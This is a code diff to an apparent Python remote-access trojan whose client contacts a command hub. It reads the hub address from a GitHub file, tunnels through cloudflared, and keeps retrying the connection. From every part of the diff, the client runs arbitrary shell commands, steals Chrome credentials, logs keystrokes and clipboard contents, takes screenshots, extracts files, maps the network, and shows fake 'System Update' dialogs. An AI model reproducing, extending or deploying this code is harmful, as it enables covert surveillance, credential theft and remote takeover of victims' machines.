@@ -7,6 +7,7 @@ import json
 import os
 import platform
 import random
+import re
 import shutil
 import socket
 import sqlite3
@@ -92,7 +93,7 @@ REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
 # Default command hub settings. These values can be overridden by
 # environment variables KING_HUB_IP / KING_HUB_PORT or by passing
 # --hub-ip / --hub-port on the command line.
-HUB_ADDRESS = 'serveo.net'
+HUB_ADDRESS = ''
 HUB_PORT = 9999
 DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt'
 
@@ -771,49 +772,53 @@ def _parse_king_destination(raw_value: str):
 
 
 def connect_to_king(king_url):
-    # 1. Kill any old, broken bridges on the Assistant's laptop
-    os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
-    time.sleep(1)
-
-    # 2. Start the bridge (This is the manual command you just ran)
-    # We use port 7777 as the 'secret' entrance
-    bridge_cmd = [
-        "cloudflared.exe", "access", "tcp", 
-        "--hostname", king_url, 
-        "--listener", "127.0.0.1:7777"
-    ]
-    subprocess.Popen(bridge_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
-    # 3. Give the bridge 5 seconds to show that 'INF Start Websocket' message
-    time.sleep(5)
-
-    # 4. Connect the Python Socket to the LOCAL bridge
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("127.0.0.1", 7777)) 
-        print("[+] Assistant successfully bridged to King!")
-        return s
-    except:
-        return None
+    while True:
+        try:
+            # A: KILL GHOSTS - Ensure no old tunnels are clogging RAM
+            os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
+            
+            # B: GET THE ADDRESS - Bypass GitHub cache to get the NEW city link
+            # Adding a timestamp (?v=...) is the 'Final Nail' for stale links
+            throne_url = f"https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt?v={time.time()}"
+            king_link = requests.get(throne_url).text.strip()
+            
+            # C: START THE BRIDGE - This turns the assistant laptop into a receiver
+            # We use a unique listener port (e.g., 7878)
+            bridge = subprocess.Popen(
+                ["cloudflared.exe", "access", "tcp", "--hostname", king_link, "--listener", "127.0.0.1:7878"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            
+            # D: THE HANDSHAKE - Wait for the Sindh network to stabilize
+            time.sleep(8)
+            
+            # E: THE SOCKET - Connect to the LOCAL bridge
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(15)
+            s.connect(("127.0.0.1", 7878))
+            
+            print("[+] Connection Established with King!")
+            return s # Success!
+            
+        except Exception as e:
+            print(f"[-] King not found. Retrying in 10 seconds...")
+            time.sleep(10) # Prevent the 'Terminal Explosion'
 
 
 def connect_direct_hub(hub_ip, port, max_retries: int = 3):
-    """Connect directly to the command hub using a raw TCP socket."""
+    """Connect directly to the command hub using WebSocket."""
+    print(f"[DEBUG] connect_direct_hub called with {hub_ip}:{port}")
+    ws_url = f"ws://{hub_ip}:{port}"
     for attempt in range(max_retries):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10.0)
-            s.connect((hub_ip, port))
-            print(f"[+] Direct connection established to hub at {hub_ip}:{port}")
-            return s
-        except (ConnectionRefusedError, ConnectionResetError, socket.timeout, OSError) as e:
+            ws = websocket.create_connection(ws_url, timeout=10)
+            print(f"[+] Direct WebSocket connection established to hub at {hub_ip}:{port}")
+            return ws
+        except Exception as e:
             if attempt < max_retries - 1:
                 time.sleep(1)
                 continue
-            print(f"[-] Direct connection failed after {max_retries} attempts: {e}")
-            return None
-        except Exception as e:
-            print(f"[-] Direct connection error: {e}")
+            print(f"[-] Direct WebSocket connection failed after {max_retries} attempts: {e}")
             return None
 
 
@@ -821,16 +826,16 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
     """Connect to the hub and process commands."""
     while True:
         try:
-            if github_throne_url:
-                try:
-                    response = requests.get(github_throne_url, timeout=10, headers={
-                        'Cache-Control': 'no-cache',
-                        'Pragma': 'no-cache',
-                    })
-                    king_url = response.text.strip()
+            use_throne = (
+                github_throne_url and
+                (not hub_ip or hub_ip.lower() == 'serveo.net')
+            )
+
+            if use_throne:
+                king_url = get_king_url(github_throne_url)
+                if king_url:
                     client = connect_to_king(king_url)
-                except Exception as e:
-                    print(f"[-] Failed to fetch King URL from throne: {e}")
+                else:
                     client = None
             else:
                 client = connect_direct_hub(hub_ip, port)
@@ -843,14 +848,21 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
             
             while True:
                 try:
-                    data = client.recv(4096).decode('utf-8', errors='ignore')
-                except socket.timeout:
+                    if isinstance(client, socket.socket):
+                        data = client.recv(1024)
+                    else:
+                        data = client.recv()
+
+                    if isinstance(data, bytes):
+                        data = data.decode('utf-8', errors='ignore')
+                    print(f"[DEBUG] Drone received: {repr(data)}")
+                except websocket.WebSocketTimeoutException:
                     continue
-                except ConnectionResetError:
+                except websocket.WebSocketConnectionClosedException:
                     print('[-] Connection reset by hub.')
                     break
                 except Exception as e:
-                    print(f'[-] Socket error: {e}')
+                    print(f'[-] WebSocket error: {e}')
                     break
 
                 if not data:
@@ -863,10 +875,9 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                         continue
 
                     elif command == 'STATUS_REPORT':
-                        client.sendall(f'STATUS:{report_status()}\n'.encode('utf-8'))
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(f'STATUS:{report_status()}')
                     elif command == 'DESKTOP_CAPTURE':
-                        capture_desktop_screenshot(client, is_websocket=False)
+                        capture_desktop_screenshot(client, is_websocket=True)
                     elif command == 'SCREENSHOT':
                         try:
                             from mss import mss
@@ -880,22 +891,22 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
 
                             # Send THE HEADER: Type|Size|Name
                             header = f"DATA_HEADER|SCREENSHOT|{len(img_data)}|snap_{int(time.time())}.png\n"
-                            client.sendall(header.encode() + img_data + b"V_PULSE_EOF")
+                            client.send(header.encode() + img_data + b"V_PULSE_EOF")
 
                             # Clean up
                             os.remove(temp_img)
                         except Exception as e:
-                            client.sendall(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
+                            client.send(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
                     elif command == 'ENSURE_SERVICE_CONTINUITY':
                         ensure_service_continuity()
-                        client.sendall(b'SERVICE_CONTINUITY_OK\n')
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'SERVICE_CONTINUITY_OK\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command == 'SHUTDOWN_NODE':
                         print('[*] Shutdown command received.')
                         return
                     elif command == 'PING':
-                        client.sendall(b'PING_OK\n')
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'PING_OK\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command.startswith('MESSAGE '):
                         # Syntax: MESSAGE "text"
                         try:
@@ -904,7 +915,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             ctypes.windll.user32.MessageBoxW(0, msg_text, 'System Update', 64)
                         except:
                             pass
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command.startswith('SHELL '):
                         # Syntax: SHELL "cmd"
                         try:
@@ -913,7 +924,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         except:
                             pass
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command.startswith('GHOST_OPEN|') or command.startswith('open '):
                         try:
                             if command.startswith('GHOST_OPEN|'):
@@ -924,27 +935,27 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             webbrowser.open(target_url)
                         except:
                             pass
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command == 'GHOST_MOVE':
                         if not PYAUTOGUI_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                         else:
                             try:
                                 pyautogui.moveRel(10, 0, duration=0.1)
                                 pyautogui.moveRel(-10, 0, duration=0.1)
                             except Exception:
                                 pass
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command.startswith('GHOST_TYPE|'):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                         else:
                             try:
                                 text = command.split('|', 1)[1]
                                 pyautogui.typewrite(text)
                             except Exception:
                                 pass
-                        client.sendall(b'V_PULSE_EOF\n')
+                        client.send(b'V_PULSE_EOF\n')
                     elif command == 'KILL_AGENT':
                         try:
                             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
@@ -967,46 +978,46 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             pass
                         return
                     elif command == 'EXPLORE_DRIVES':
-                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
+                        send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=True)
                     elif command == 'HARVEST_USER':
-                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=False)
+                        send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=True)
                     elif command == 'NETWORK_TOPOLOGY':
-                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=False)
+                        send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=True)
                     elif command == 'EXTRACT_CREDENTIALS':
-                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=False)
+                        send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=True)
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pynput\n')
+                            client.send(b'DEPENDENCY_MISSING: pynput\n')
                         else:
-                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
+                            send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=True)
                     elif command.startswith('EXTRACT_FILE '):
                         file_path = command[13:].strip('"')
                         payload = extract_file_bytes(file_path)
                         if payload is None:
-                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=False)
+                            send_atomic_data(client, 'FILE', f'Error: could not read {file_path}'.encode('utf-8'), os.path.basename(file_path) or 'unknown.txt', is_websocket=True)
                         else:
-                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=False)
+                            send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=True)
                     elif command.startswith('KEYLOG'):
                         if not PYNPUT_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pynput\n')
+                            client.send(b'DEPENDENCY_MISSING: pynput\n')
                         elif 'START' in command.upper():
-                            client.sendall(f'KEYLOG_RESULT: {start_keylogger()}\n'.encode('utf-8'))
+                            client.send(f'KEYLOG_RESULT: {start_keylogger()}\n'.encode('utf-8'))
                         elif 'STOP' in command.upper():
-                            client.sendall(f'KEYLOG_RESULT: {stop_keylogger()}\n'.encode('utf-8'))
+                            client.send(f'KEYLOG_RESULT: {stop_keylogger()}\n'.encode('utf-8'))
                         else:
-                            client.sendall(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\n')
+                            client.send(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\n')
                     elif command.startswith('CLIPBOARD'):
                         if not PYPERCLIP_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyperclip\n')
+                            client.send(b'DEPENDENCY_MISSING: pyperclip\n')
                         elif 'START' in command.upper():
-                            client.sendall(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\n'.encode('utf-8'))
+                            client.send(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\n'.encode('utf-8'))
                         elif 'STOP' in command.upper():
-                            client.sendall(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\n'.encode('utf-8'))
+                            client.send(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\n'.encode('utf-8'))
                         else:
-                            client.sendall(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\n')
+                            client.send(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\n')
                     elif command.startswith('CLICK '):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                         else:
                             try:
                                 parts = command.split()
@@ -1017,7 +1028,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 pass
                     elif command.startswith('TYPE '):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\n')
+                            client.send(b'DEPENDENCY_MISSING: pyautogui\n')
                         else:
                             try:
                                 text = command[5:].strip('"')
@@ -1061,6 +1072,22 @@ def parse_args():
     if not args.github_throne_url and args.throne_url:
         args.github_throne_url = args.throne_url
     return args
+
+
+def get_king_url(github_throne_url=DEFAULT_GITHUB_THRONE_URL):
+    """Pull the fresh King URL from GitHub throne."""
+    if not github_throne_url:
+        return None
+
+    try:
+        response = requests.get(github_throne_url, timeout=10, headers={
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+        })
+        return response.text.strip()
+    except Exception as e:
+        print(f'[-] Failed to fetch King URL from throne: {e}')
+        return None
 
 
 def main_loop(hub_ip, port, github_throne_url):
